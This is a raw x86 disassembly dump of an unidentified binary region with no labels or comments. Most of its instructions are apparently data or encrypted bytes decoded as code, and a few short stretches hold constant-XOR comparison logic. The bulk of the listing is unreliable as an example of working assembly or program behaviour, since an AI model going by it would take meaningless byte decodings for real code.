  41aeaa:	lock pop ds
  41aeac:	xor    eax,0xa0f3e1d0
  41aeb1:	jno    0x41ae9a
  41aeb3:	shl    DWORD PTR [eax],1
  41aeb5:	mov    ebx,0x1690aa6
  41aeba:	jmp    0xdd72c62c
  41aebf:	pop    es
  41aec0:	jmp    0xb0e1ec83
  41aec5:	ins    DWORD PTR es:[edi],dx
  41aec6:	into   
  41aec7:	pop    ds
  41aec8:	mov    ebx,0x786fe3af
  41aecd:	xor    DWORD PTR [ebx],edx
  41aecf:	or     eax,0x992b90c2
  41aed4:	jb     0x41aed8
  41aed6:	xchg   ecx,eax
  41aed7:	jmp    0x41aed4
  41aed9:	dec    eax
  41aeda:	das    
  41aedb:	leave  
  41aedc:	cs and al,0xed
  41aedf:	adc    ecx,DWORD PTR [esi+0x43fc5a8f]
  41aee5:	mov    ebp,0xb25d607f
  41aeea:	mov    ecx,0xb2fda99e
  41aeef:	cmp    bl,dl
  41aef1:	mov    ebp,0x50476bc8
  41aef6:	mov    ds:0xf07a5172,al
  41aefb:	mov    ebx,0xfd9bc500
  41af00:	lock dec BYTE PTR [esi-0x14659fbe]
  41af07:	aad    0xed
  41af09:	cld    
  41af0a:	icebp  
  41af0b:	jne    0x41af38
  41af0d:	adc    DWORD PTR [ebp+0x3b],edi
  41af10:	mov    edi,0xc8eaaa41
  41af15:	mov    ds:0x4840ff3,eax
  41af1a:	sub    al,BYTE PTR [eax]
  41af1c:	add    BYTE PTR [ebx-0x74bfdbbc],cl
  41af22:	push   esp
  41af23:	and    al,0x18
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41aff1
  41af80:	js     0x41af59
  41af82:	mov    esp,0x18169717
  41af87:	mov    esp,0x20181812
  41af8c:	pop    edx
  41af8d:	pop    ss
  41af8e:	loope  0x41af44
  41af90:	mov    bl,0x3b
  41af92:	popa   
  41af93:	jmp    0xd698:0xb59eff39
  41af9a:	ret    
  41af9b:	push   0x2b67c2b1
  41afa0:	popa   
  41afa1:	sar    BYTE PTR [eax-0x6a],0x87
  41afa5:	sbb    ecx,DWORD PTR [edx-0x73]
  41afa8:	in     eax,0x1d
  41afaa:	cmp    DWORD PTR [esi-0x4afe8cad],0xc7677cd6
  41afb4:	push   0xbbcfbce7
  41afb9:	mov    eax,0x63505e32
  41afbe:	xchg   ecx,eax
  41afbf:	loope  0x41b02b
  41afc1:	aaa    
  41afc2:	pop    edx
  41afc3:	inc    esi
  41afc4:	imul   esi,DWORD PTR [eax-0x6a],0x2a418d45
  41afcb:	jg     0x41afed
  41afcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afce:	fisubr DWORD PTR [eax]
  41afd0:	lea    ebp,[edx*1+0x1c851128]
  41afd7:	jb     0x41af8c
  41afd9:	call   0x7e23c877
  41afde:	stos   BYTE PTR es:[edi],al
  41afdf:	je     0x41b026
  41afe1:	test   DWORD PTR [esi-0x1a],esi
  41afe4:	and    DWORD PTR [ecx+ebp*1+0x10dc7e68],esp
  41afeb:	repz aam 0xd0
  41afee:	inc    ebp
  41afef:	dec    edx
  41aff0:	rcl    DWORD PTR [ecx+edx*8],0x1
  41aff4:	push   ds
  41aff5:	jmp    FWORD PTR [esi+eiz*2-0x5e]
  41aff9:	imul   ecx,DWORD PTR [edx-0x64b5d1fe],0xffffff89
  41b000:	popa   
  41b001:	jp     0x41afa3
  41b003:	dec    edi
  41b004:	daa    
  41b005:	lods   eax,DWORD PTR ds:[esi]
  41b006:	or     al,0x55
  41b008:	dec    edi
  41b009:	xor    BYTE PTR [ebp+0x77],cl
  41b00c:	cmp    ah,al
  41b00e:	mov    eax,ds:0x7e8ae7a8
  41b013:	das    
  41b014:	in     al,0xf9
  41b016:	retf   0x7e0d
  41b019:	sbb    eax,0x43fda56e
  41b01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b01f:	rcr    DWORD PTR [edx],0x55
  41b022:	cmp    BYTE PTR [eax-0x6e],0xdd
  41b026:	pop    edx
  41b027:	add    bl,0xe0
  41b02a:	(bad)  
  41b02b:	mov    al,0xe7
  41b02d:	popf   
  41b02e:	and    cl,BYTE PTR [edx+eiz*4]
  41b031:	fs mov ebx,0x4214f954
  41b037:	or     BYTE PTR [ebx-0x4c],ch
  41b03a:	call   0x54bc99df
  41b03f:	inc    edx
  41b040:	xchg   edi,eax
  41b041:	pop    es
  41b042:	mov    ah,0xbc
  41b044:	and    esp,DWORD PTR [edx]
  41b046:	data16 jg 0x41b027
  41b049:	out    0x6b,eax
  41b04b:	xchg   ecx,eax
  41b04c:	test   eax,0x12a1063e
  41b051:	lahf   
  41b052:	ds add esp,edx
  41b055:	mov    al,ds:0x9a2d3a9f
  41b05a:	cmc    
  41b05b:	xor    edi,0xfffffff4
  41b05e:	sub    al,0x75
  41b060:	js     0x41aff7
  41b062:	sub    BYTE PTR [ebx+0x31656a31],ch
  41b068:	inc    edx
  41b069:	mul    ebp
  41b06b:	stos   BYTE PTR es:[edi],al
  41b06c:	and    DWORD PTR [eax+eiz*1+0x3e],esi
  41b070:	fbld   TBYTE PTR [eax]
  41b072:	push   ebx
  41b073:	mov    ecx,0xd925111d
  41b078:	in     al,0x5b
  41b07a:	mov    esp,0x64da30f6
  41b07f:	lea    ebx,[esi+0x35]
  41b082:	xor    eax,DWORD PTR [eax]
  41b084:	popf   
  41b085:	shl    DWORD PTR [ebp+edi*2-0x56fa572c],cl
  41b08c:	mov    edi,0xbde9a058
  41b091:	adc    ebp,DWORD PTR [edi-0x1055575c]
  41b097:	ins    BYTE PTR es:[edi],dx
  41b098:	data16 ja 0x41b067
  41b09b:	fiadd  WORD PTR [ecx-0x24]
  41b09e:	ds je  0x41b0bf
  41b0a1:	ss iret 
  41b0a3:	ins    DWORD PTR es:[edi],dx
  41b0a4:	mov    edx,0xe5025ec7
  41b0a9:	ds pop eax
  41b0ab:	out    dx,al
  41b0ac:	mov    edi,0x20a8e610
  41b0b1:	dec    esp
  41b0b2:	inc    edx
  41b0b3:	mov    cl,0x1c
  41b0b5:	jns    0x41b12a
  41b0b7:	pop    es
  41b0b8:	aaa    
  41b0b9:	push   ebx
  41b0ba:	enter  0xd089,0xcb
  41b0be:	sbb    DWORD PTR [ebx-0x5210f1d4],ebp
  41b0c4:	cmc    
  41b0c5:	mov    al,0x5d
  41b0c7:	in     eax,0xb4
  41b0c9:	inc    eax
  41b0ca:	fs loop 0x41b126
  41b0cd:	pop    edx
  41b0ce:	cmp    ebp,DWORD PTR [edx-0x680391b9]
  41b0d4:	mov    dl,0xe5
  41b0d6:	pop    eax
  41b0d7:	push   ebp
  41b0d8:	(bad)  
  41b0da:	fldcw  WORD PTR [edi+0x12f0c038]
  41b0e0:	adc    al,0xe2
  41b0e2:	fsubr  DWORD PTR [ecx]
  41b0e4:	jo     0x41b11e
  41b0e6:	test   eax,0x7d3399e0
  41b0eb:	inc    ebp
  41b0ec:	xor    BYTE PTR [edx+ecx*1-0x5d],ch
  41b0f0:	push   eax
  41b0f1:	(bad)  
  41b0f2:	sbb    ebx,esi
  41b0f4:	mov    bl,dl
  41b0f6:	push   esp
  41b0f7:	pop    ebx
  41b0f8:	add    al,0xac
  41b0fa:	jns    0x41b16d
  41b0fc:	sub    eax,edi
  41b0fe:	push   0x18b4b74
  41b103:	cmp    eax,0xcfab802b
  41b108:	in     eax,0x43
  41b10a:	pop    esp
  41b10b:	lahf   
  41b10c:	and    ebx,DWORD PTR [ebx-0x47bcafc0]
  41b112:	mov    esp,0x68e158d3
  41b117:	or     eax,0xa0c74b44
  41b11c:	pop    ebx
  41b11d:	or     esi,DWORD PTR [ebp-0x2867932c]
  41b123:	xor    al,0x71
  41b125:	and    BYTE PTR [ecx],dl
  41b127:	cmc    
  41b128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b129:	add    ah,BYTE PTR [edx-0x1c]
  41b12c:	js     0x41b0d9
  41b12e:	cmp    BYTE PTR [esi-0x71d5513],ah
  41b134:	mov    WORD PTR [ecx+0x50e4d291],ds
  41b13a:	pop    ds
  41b13b:	fs and eax,0xb0847005
  41b141:	(bad)  
  41b142:	shr    edi,cl
  41b144:	hlt    
  41b145:	outs   dx,DWORD PTR ds:[esi]
  41b146:	lock sahf 
  41b148:	ins    WORD PTR es:[edi],dx
  41b14a:	xchg   ecx,eax
  41b14b:	add    BYTE PTR [ebx-0x3b3acf1],dl
  41b151:	ror    dh,0xfe
  41b154:	daa    
  41b155:	sub    al,0x4c
  41b157:	in     eax,0x3c
  41b159:	(bad)  
  41b15a:	stos   BYTE PTR es:[edi],al
  41b15b:	add    ebx,ebp
  41b15d:	mov    ch,0x6e
  41b15f:	(bad)  
  41b161:	jl     0x41b0f4
  41b163:	scas   eax,DWORD PTR es:[edi]
  41b164:	fisttp QWORD PTR [eax-0x2e]
  41b167:	jne    0x41b1bb
  41b169:	jg     0x41b1be
  41b16b:	adc    al,0x98
  41b16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b16e:	jg     0x41b148
  41b170:	xchg   esp,eax
  41b171:	inc    esi
  41b172:	mov    esp,0x4fa9c28a
  41b177:	neg    ecx
  41b179:	shl    ebp,0xfe
  41b17c:	pop    esi
  41b17d:	repz stc 
  41b17f:	(bad)  
  41b180:	sar    BYTE PTR [ecx+0x5a],cl
  41b183:	ficom  DWORD PTR [edi-0x530e7a41]
  41b189:	into   
  41b18a:	repz inc edx
  41b18c:	pop    ebx
  41b18d:	adc    eax,0xe350eba3
  41b192:	cld    
  41b193:	xor    BYTE PTR [ebx],dh
  41b195:	enter  0xc2e0,0x4b
  41b199:	and    eax,0x2191504
  41b19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b19f:	push   ds
  41b1a0:	retf   0xa3ff
  41b1a3:	jb     0x41b1eb
  41b1a5:	cmp    al,0x77
  41b1a7:	sub    BYTE PTR [edi-0x60],bh
  41b1aa:	fstp   QWORD PTR [ecx+0x54]
  41b1ad:	dec    esi
  41b1ae:	mov    ecx,0xcba9edf2
  41b1b3:	cmp    DWORD PTR [ebx+0x31b0e73b],ebx
  41b1b9:	into   
  41b1ba:	sahf   
  41b1bb:	and    dh,BYTE PTR [edx+0x3e]
  41b1be:	and    BYTE PTR [ebp+0x7ddeefb7],dl
  41b1c4:	mov    al,ds:0xab9b56bf
  41b1c9:	leave  
  41b1ca:	(bad)
  41b1cd:	inc    ebp
  41b1ce:	test   DWORD PTR ds:0x6950eccb,0x44df3b9
  41b1d8:	adc    BYTE PTR [edx],dh
  41b1da:	fdivr  DWORD PTR [esi+0x7a56f5cc]
  41b1e0:	lea    esp,[ebx+0x6699f978]
  41b1e6:	(bad)  
  41b1e7:	xor    DWORD PTR [edx],edi
  41b1e9:	popa   
  41b1ea:	push   ecx
  41b1eb:	stos   BYTE PTR es:[edi],al
  41b1ec:	cs push esp
  41b1ee:	add    esi,DWORD PTR [ecx]
  41b1f0:	xor    eax,0x6a6e55a
  41b1f5:	pop    esp
  41b1f6:	repz not DWORD PTR [esi+ecx*8-0x27]
  41b1fb:	or     bl,ah
  41b1fd:	dec    esi
  41b1fe:	and    BYTE PTR [ebp-0x5e],ah
  41b201:	adc    DWORD PTR [esi-0x1b3fc3f3],ebx
  41b207:	add    DWORD PTR [eax-0x60],esi
  41b20a:	fs pop edx
  41b20c:	sar    BYTE PTR [ecx-0x57],0xa6
  41b210:	cmp    dh,cl
  41b212:	or     BYTE PTR [eax-0x7f],cl
  41b215:	lock pop es
  41b217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b218:	retf   
  41b219:	lahf   
  41b21a:	mov    bl,0x40
  41b21c:	clc    
  41b21d:	mov    BYTE PTR [ecx],ah
  41b21f:	test   al,0x9d
  41b221:	sub    eax,0x3665d6d2
  41b226:	mov    edi,0x1bb25f22
  41b22b:	add    DWORD PTR [eax-0x13],0xf2b672e7
  41b232:	xor    cl,BYTE PTR [eax-0x75]
  41b235:	add    ebx,ebx
  41b237:	mov    dh,0x4d
  41b239:	xor    DWORD PTR [edx+0x7bc9110d],edi
  41b23f:	mov    eax,ds:0x33bc3ca5
  41b244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b245:	das    
  41b246:	pop    edx
  41b247:	xchg   DWORD PTR [esi],esi
  41b249:	aam    0x9e
  41b24b:	dec    edx
  41b24c:	or     esp,DWORD PTR [ebp+0x6d8ab6c4]
  41b252:	and    al,0x29
  41b254:	data16 mov WORD PTR [esi],ds
  41b257:	fdivr  DWORD PTR [eax]
  41b259:	mov    bl,0x9b
  41b25b:	jle    0x41b278
  41b25d:	ins    BYTE PTR es:[edi],dx
  41b25e:	pcmpeqb mm3,QWORD PTR [ebp+0x2b]
  41b262:	outs   dx,BYTE PTR ds:[esi]
  41b263:	lock push ds
  41b265:	sar    DWORD PTR [esi-0x2b],cl
  41b268:	mov    al,ds:0xdb23642b
  41b26d:	adc    eax,0xe9a792fe
  41b272:	fs push esp
  41b274:	mov    al,ds:0xdac906d4
  41b279:	scas   al,BYTE PTR es:[edi]
  41b27a:	(bad)  
  41b27d:	in     al,dx
  41b27e:	gs mov esp,?
  41b281:	xor    edx,DWORD PTR [edi]
  41b283:	xchg   BYTE PTR [ebp+0x3e],cl
  41b286:	xor    esi,DWORD PTR [eax]
  41b288:	xchg   edi,eax
  41b289:	adc    al,0x35
  41b28b:	add    DWORD PTR [edx+0x79e82bf2],ebx
  41b291:	outs   dx,DWORD PTR ds:[esi]
  41b292:	mov    edi,DWORD PTR [ebx]
  41b294:	mov    WORD PTR [edx+0x2],gs
  41b297:	mov    ds:0x37f57d4,eax
  41b29c:	dec    eax
  41b29d:	dec    eax
  41b29e:	push   0xae991bbc
  41b2a3:	cld    
  41b2a4:	out    dx,al
  41b2a5:	push   ebx
  41b2a6:	retf   
  41b2a7:	dec    ebx
  41b2a8:	pop    esp
  41b2a9:	xor    al,ah
  41b2ab:	(bad)  
  41b2ac:	xlat   BYTE PTR ds:[ebx]
  41b2ad:	dec    eax
  41b2ae:	inc    eax
  41b2af:	popf   
  41b2b0:	sub    ecx,DWORD PTR [ebx]
  41b2b2:	inc    edi
  41b2b3:	sti    
  41b2b4:	dec    edi
  41b2b5:	outs   dx,BYTE PTR ds:[esi]
  41b2b6:	pop    edi
  41b2b7:	adc    ah,dh
  41b2b9:	test   DWORD PTR [edi+0x1],ebp
  41b2bc:	jg     0x41b318
  41b2be:	xchg   esp,eax
  41b2bf:	push   eax
  41b2c0:	call   0xf2f80fce
  41b2c5:	push   edx
  41b2c6:	dec    ebp
  41b2c7:	push   edx
  41b2c8:	xchg   edx,eax
  41b2c9:	cdq    
  41b2ca:	mov    esp,0x9db5cb5f
  41b2cf:	imul   esi,esp,0xffffffe1
  41b2d2:	add    al,0x85
  41b2d4:	aad    0x5
  41b2d6:	lods   eax,DWORD PTR ds:[esi]
  41b2d7:	inc    edx
  41b2d8:	jbe    0x41b31a
  41b2da:	mov    ds:0x292415c4,al
  41b2df:	or     BYTE PTR [ecx],al
  41b2e1:	ds ss mov edx,0x8394a76b
  41b2e8:	in     eax,dx
  41b2e9:	sbb    al,0x29
  41b2eb:	push   es
  41b2ec:	fcmovne st,st(7)
  41b2ee:	pop    ebp
  41b2ef:	jmp    0x8762:0x290bcb51
  41b2f6:	push   esi
  41b2f7:	mov    edi,0x5766c0f2
  41b2fc:	push   eax
  41b2fd:	lock mov edx,0x8e58a40f
  41b303:	push   edi
  41b304:	inc    ebx
  41b305:	ficom  WORD PTR [ecx+0x52d07502]
  41b30b:	or     ah,BYTE PTR [edi-0x6d0f130b]
  41b311:	push   ds
  41b312:	mov    eax,0x63df69d8
  41b317:	stc    
  41b318:	test   al,0x3e
  41b31a:	(bad)  
  41b31b:	mov    eax,0x2a9fc2a5
  41b320:	into   
  41b321:	adc    al,0xed
  41b323:	(bad)  
  41b324:	lods   eax,DWORD PTR ds:[esi]
  41b325:	js     0x41b357
  41b327:	cmp    al,0xe1
  41b329:	push   cs
  41b32a:	add    DWORD PTR [ebx],0x1c
  41b32d:	lods   eax,DWORD PTR ds:[esi]
  41b32e:	mov    eax,ds:0x3750c4ec
  41b333:	xchg   esi,eax
  41b334:	xor    eax,0x8acb87db
  41b339:	pop    edx
  41b33a:	sahf   
  41b33b:	push   esp
  41b33c:	xchg   edx,eax
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	add    edi,DWORD PTR [ebx]
  41b369:	in     al,dx
  41b36a:	mov    esi,0x18168fbb
  41b36f:	mov    esp,0x19181812
  41b374:	fstp   DWORD PTR [ebx-0x8]
  41b377:	sub    ah,bh
  41b379:	fmul   DWORD PTR [edi-0x7]
  41b37c:	fistp  DWORD PTR [ecx-0x6f]
  41b37f:	test   BYTE PTR [ebx+0x5],bh
  41b382:	push   0x37566b80
  41b387:	fisub  WORD PTR [ebx+0x72]
  41b38a:	xchg   BYTE PTR [edi],bh
  41b38c:	in     al,0x7d
  41b38e:	fxam   
  41b390:	fiadd  DWORD PTR [edx+0x323154e]
  41b396:	jp     0x41b3b2
  41b398:	inc    esi
  41b399:	inc    ebx
  41b39a:	add    DWORD PTR [ebp+0x42089bf],edi
  41b3a0:	sar    BYTE PTR [edx+0x7863f675],cl
  41b3a6:	mov    ah,BYTE PTR [ebx+0x22]
  41b3a9:	inc    edx
  41b3aa:	adc    DWORD PTR [eax],eax
  41b3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ad:	and    ebp,edi
  41b3af:	mov    eax,ds:0x8a81a833
  41b3b4:	test   eax,0x25fb93c6
  41b3b9:	mov    edi,0xf91dd092
  41b3be:	int3   
  41b3bf:	adc    al,0x41
  41b3c1:	pushf  
  41b3c2:	xor    DWORD PTR [eax+0x7af6aeed],ebx
  41b3c8:	sub    dh,cl
  41b3ca:	xlat   BYTE PTR ds:[ebx]
  41b3cb:	loope  0x41b410
  41b3cd:	and    eax,0xbd308897
  41b3d2:	loope  0x41b3b6
  41b3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3d5:	fisub  DWORD PTR [esi]
  41b3d7:	or     DWORD PTR [edi+0x6],0xffffffb3
  41b3db:	retf   
  41b3dc:	cmp    BYTE PTR [edx-0x33],ah
  41b3df:	inc    ebx
  41b3e0:	jg     0x41b37f
  41b3e2:	push   edi
  41b3e3:	cmp    dl,bl
  41b3e5:	bound  edx,QWORD PTR [ecx-0x59]
  41b3e8:	lahf   
  41b3e9:	ds lahf 
  41b3eb:	call   0x1feb968e
  41b3f0:	jecxz  0x41b3a7
  41b3f2:	int3   
  41b3f3:	out    dx,al
  41b3f4:	(bad)  
  41b3f6:	fstp   TBYTE PTR [ebx+0x52a62804]
  41b3fc:	mov    ebp,0x8a085b3c
  41b401:	ret    
  41b402:	sub    edx,DWORD PTR [edx+0x61a22632]
  41b408:	jbe    0x41b478
  41b40a:	xchg   ebx,eax
  41b40b:	test   eax,0xc94f82f1
  41b410:	ins    DWORD PTR es:[edi],dx
  41b411:	imul   ebp,DWORD PTR [esi+eax*1],0xffffffbd
  41b415:	dec    ebx
  41b416:	hlt    
  41b417:	cmp    eax,0x3ac3875f
  41b41c:	sub    eax,0x2c0d9f63
  41b421:	call   DWORD PTR [esi]
  41b423:	and    ebp,esi
  41b425:	mov    DWORD PTR [ebp-0x6dd8ca01],0x73f0cb3d
  41b42f:	ja     0x41b406
  41b431:	imul   esp,DWORD PTR [eax*4+0x7d50e37e],0x70
  41b439:	sub    esi,edx
  41b43b:	call   0x3beb64b8
  41b440:	pop    ecx
  41b441:	xchg   esi,eax
  41b442:	push   ecx
  41b443:	in     eax,dx
  41b444:	dec    esp
  41b445:	sbb    al,0x71
  41b447:	inc    eax
  41b448:	shl    al,cl
  41b44a:	mov    bh,0xa1
  41b44c:	fbld   TBYTE PTR [esi+0x51]
  41b44f:	push   cs
  41b450:	test   eax,0x1d8e76db
  41b455:	imul   ecx,edx,0x758cbb85
  41b45b:	icebp  
  41b45c:	inc    edi
  41b45d:	adc    al,0xd2
  41b45f:	adc    DWORD PTR [ecx-0x1f],ebp
  41b462:	iret   
  41b463:	cdq    
  41b464:	ins    DWORD PTR es:[edi],dx
  41b465:	add    ebx,DWORD PTR [edi]
  41b467:	jbe    0x41b3eb
  41b469:	add    ebp,DWORD PTR [ebx+0x74]
  41b46c:	xchg   edx,eax
  41b46d:	fist   DWORD PTR [eax+0x71314bbb]
  41b473:	lea    ebx,[ebx+ebx*8-0x14]
  41b477:	cmp    eax,0x8a5f831e
  41b47c:	xor    eax,0x359d0cd9
  41b481:	mov    WORD PTR [esi],ss
  41b483:	inc    ebx
  41b484:	push   ss
  41b485:	ins    BYTE PTR es:[edi],dx
  41b486:	cdq    
  41b487:	inc    edx
  41b488:	mov    ecx,0xadfc30da
  41b48d:	addr16 aad 0x57
  41b490:	fisub  DWORD PTR [edx+0x4]
  41b493:	and    al,0x5d
  41b495:	add    eax,0x2303fb9d
  41b49a:	outs   dx,DWORD PTR ds:[esi]
  41b49b:	sub    al,0xf8
  41b49d:	sub    eax,0x836d87e3
  41b4a2:	ror    ebp,cl
  41b4a4:	loope  0x41b4a2
  41b4a6:	pop    esp
  41b4a7:	adc    BYTE PTR [ecx-0x5b89e367],0x50
  41b4ae:	out    dx,al
  41b4af:	lods   al,BYTE PTR ds:[esi]
  41b4b0:	inc    esi
  41b4b1:	mov    ds,WORD PTR [edx-0x17019347]
  41b4b7:	mov    DWORD PTR [eax-0x80],esi
  41b4ba:	push   ss
  41b4bb:	mov    BYTE PTR [ecx+esi*8],dh
  41b4be:	lock mov eax,0x16feb4c5
  41b4c4:	or     esp,DWORD PTR [ecx+edi*4+0x17f12dda]
  41b4cb:	cmp    BYTE PTR [ecx-0x70],ah
  41b4ce:	adc    DWORD PTR [eax-0x4],0x23d65953
  41b4d5:	retf   
  41b4d6:	call   0xbc7e:0x4d601e90
  41b4dd:	jecxz  0x41b4fe
  41b4df:	pushf  
  41b4e0:	mov    es,WORD PTR [eax+0x4f]
  41b4e3:	push   0xbd1f37b2
  41b4e8:	jmp    0x41b4a6
  41b4ea:	push   ecx
  41b4eb:	ret    0x6502
  41b4ee:	int3   
  41b4ef:	repz push edi
  41b4f1:	pop    eax
  41b4f2:	mov    ch,0x10
  41b4f4:	adc    bl,bl
  41b4f6:	js     0x41b487
  41b4f8:	(bad)  
  41b4f9:	xor    edi,DWORD PTR [ebp-0x25f01223]
  41b4ff:	inc    ebp
  41b500:	pop    eax
  41b501:	rcl    BYTE PTR [ebx+ebx*2],cl
  41b504:	inc    ebx
  41b505:	out    dx,al
  41b506:	retf   
  41b507:	les    edi,FWORD PTR [edi+0x27]
  41b50a:	cmc    
  41b50b:	iret   
  41b50c:	jbe    0x41b4ba
  41b50e:	in     al,dx
  41b50f:	sahf   
  41b510:	imul   ebp,DWORD PTR [ebx],0xf537bfc9
  41b516:	stc    
  41b517:	or     ah,BYTE PTR [ecx+ebx*2-0x6f]
  41b51b:	jmp    0x48f5:0x276d59de
  41b522:	ja     0x41b502
  41b524:	fild   WORD PTR [eax+ecx*8-0x18]
  41b528:	in     al,0x82
  41b52a:	test   al,0xa3
  41b52c:	add    al,0x76
  41b52e:	inc    esp
  41b52f:	fbld   TBYTE PTR [edi]
  41b531:	sub    al,0x6c
  41b533:	sbb    BYTE PTR [edx],bh
  41b535:	jecxz  0x41b57b
  41b537:	mov    cl,BYTE PTR [ebp+0x6843ee55]
  41b53d:	(bad)  
  41b53e:	fisubr WORD PTR [ebp+0x39]
  41b541:	xchg   BYTE PTR ss:[esi],bl
  41b544:	or     al,0xc3
  41b546:	push   edx
  41b547:	fs add eax,ebp
  41b54a:	sbb    DWORD PTR [edx],ebx
  41b54c:	fisubr DWORD PTR [edx]
  41b54e:	adc    ebx,DWORD PTR [ebp-0xa2eb44e]
  41b554:	ret    0x1739
  41b557:	mov    BYTE PTR ds:0x59ff73db,0x85
  41b55e:	cmp    DWORD PTR [ecx-0x3fa0fb95],edx
  41b564:	shr    BYTE PTR [edi],0x63
  41b567:	imul   edx,edx,0x8a16671
  41b56d:	xchg   ebp,eax
  41b56e:	leave  
  41b56f:	mov    ecx,0x30ccb94e
  41b574:	or     eax,0x105a05a6
  41b579:	in     eax,0x24
  41b57b:	out    dx,eax
  41b57c:	std    
  41b57d:	sub    al,0x8d
  41b57f:	push   ecx
  41b580:	mov    cl,0x41
  41b582:	popa   
  41b583:	loope  0x41b55c
  41b585:	arpl   WORD PTR [esi+0x2e],dx
  41b588:	add    dh,BYTE PTR [ebp+esi*2-0x5c782152]
  41b58f:	push   edx
  41b590:	idiv   DWORD PTR [ecx+eiz*2]
  41b593:	pusha  
  41b594:	jnp    0x41b5b2
  41b596:	xor    ebp,DWORD PTR [eax+ecx*2]
  41b599:	push   edx
  41b59a:	dec    ecx
  41b59b:	icebp  
  41b59c:	lods   al,BYTE PTR ds:[esi]
  41b59d:	push   edx
  41b59e:	in     al,0x41
  41b5a0:	dec    esi
  41b5a1:	popa   
  41b5a2:	pop    eax
  41b5a3:	loop   0x41b61a
  41b5a5:	cmp    al,dh
  41b5a7:	fdivr  DWORD PTR cs:[eax-0x1e]
  41b5ab:	mov    ax,0x16d2
  41b5af:	stos   DWORD PTR es:[edi],eax
  41b5b0:	sbb    BYTE PTR [esi],dh
  41b5b2:	aam    0xf4
  41b5b4:	push   ss
  41b5b5:	jns    0x41b564
  41b5b7:	(bad)  
  41b5b8:	cld    
  41b5b9:	mov    edx,0x57e2f089
  41b5be:	in     al,dx
  41b5bf:	jmp    0x40ab:0xd42b0a40
  41b5c6:	pop    ecx
  41b5c7:	dec    ecx
  41b5c8:	jae    0x41b565
  41b5ca:	jnp    0x41b58c
  41b5cc:	adc    al,0xcb
  41b5ce:	sti    
  41b5cf:	sbb    al,0x54
  41b5d1:	repz fisttp QWORD PTR ds:[eax-0x9a2ef22]
  41b5d9:	cmp    ah,BYTE PTR [ecx+0x63e8e3f3]
  41b5df:	pop    eax
  41b5e0:	fcomp  st(6)
  41b5e2:	mov    ch,0x72
  41b5e4:	int3   
  41b5e5:	hlt    
  41b5e6:	cmp    BYTE PTR [ebx+esi*4-0x24f34593],ah
  41b5ed:	out    0x42,al
  41b5ef:	push   esp
  41b5f0:	ja     0x41b61f
  41b5f2:	or     DWORD PTR [eax+0x781424ed],esp
  41b5f8:	neg    DWORD PTR [edi]
  41b5fa:	xchg   ebp,eax
  41b5fb:	jnp    0x41b580
  41b5fd:	push   edx
  41b5fe:	xchg   ebp,eax
  41b5ff:	mov    bh,0x34
  41b601:	data16 daa 
  41b603:	jmp    0xf1e4:0xf546b27d
  41b60a:	add    ah,al
  41b60c:	fstp   TBYTE PTR [ebx-0x4914a416]
  41b612:	jae    0x41b658
  41b614:	jb     0x41b5f3
  41b616:	cmp    BYTE PTR [ecx],dh
  41b618:	mov    edi,DWORD PTR [edi]
  41b61a:	aas    
  41b61b:	shl    BYTE PTR [ebx+eiz*4],cl
  41b61e:	mov    edx,0x41ff3a97
  41b623:	es xchg ecx,eax
  41b625:	adc    al,0x8f
  41b627:	add    eax,0xfb31fd91
  41b62c:	add    esi,edi
  41b62e:	ins    BYTE PTR es:[edi],dx
  41b62f:	mov    ah,0xe5
  41b631:	js     0x41b69c
  41b633:	pop    eax
  41b634:	out    dx,eax
  41b635:	or     eax,0xf2a5331a
  41b63a:	sbb    BYTE PTR [ebp+0x7f],dl
  41b63d:	push   ebp
  41b63e:	aad    0x76
  41b640:	int    0x73
  41b642:	in     eax,dx
  41b643:	mov    al,ds:0xadede1ec
  41b648:	mov    ds:0xee9383e0,eax
  41b64d:	test   eax,0x3dafa0e1
  41b652:	out    dx,eax
  41b653:	push   ebp
  41b654:	inc    ebp
  41b655:	push   esp
  41b656:	aas    
  41b657:	and    ecx,esp
  41b659:	not    BYTE PTR [ebp+0x412be561]
  41b65f:	and    eax,DWORD PTR [edi]
  41b661:	(bad)  
  41b662:	cwde   
  41b663:	cmp    al,0x77
  41b665:	mov    BYTE PTR [edx-0x6274d0a4],al
  41b66b:	hlt    
  41b66c:	and    al,0x8
  41b66e:	adc    al,0x18
  41b670:	jne    0x41b5f3
  41b672:	arpl   bp,ax
